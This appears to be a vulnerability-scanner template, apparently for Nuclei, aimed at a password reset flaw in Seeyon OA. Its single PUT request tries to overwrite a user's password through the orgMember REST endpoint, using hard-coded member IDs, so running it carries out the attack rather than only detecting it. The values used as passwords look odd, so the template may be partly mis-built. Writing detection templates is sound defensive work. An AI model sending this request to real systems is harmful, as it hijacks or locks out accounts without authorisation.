id: poc-yaml-seeyon-oa-ucpclogin-reset-password
info:
  name: Seeyon OA Arbitrary Password Reset Vulnerability
  author: ProjectDiscoveryAI
  severity: critical
  tags: seeyon,oa,password-reset,critical
  description: |
    This template detects a vulnerability in Seeyon OA that allows arbitrary password resets via specific endpoints.

variables:
  passwd:
    - share.do
    - genericController.do
  id:
    - 5725175934914479521L
    - -4401606663639775639

http:
  - method: PUT
    path:
      - "{{BaseURL}}/seeyon/rest/orgMember/{{id}}/password/{{passwd}}"
    headers:
      Content-Type: application/json
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "SUCCESS"
          - "\"enabled\":true"
          - "\"isDeleted\":false"
          - "\"orgAccountId\""
      - type: word
        part: header
        words:
          - "application/json"
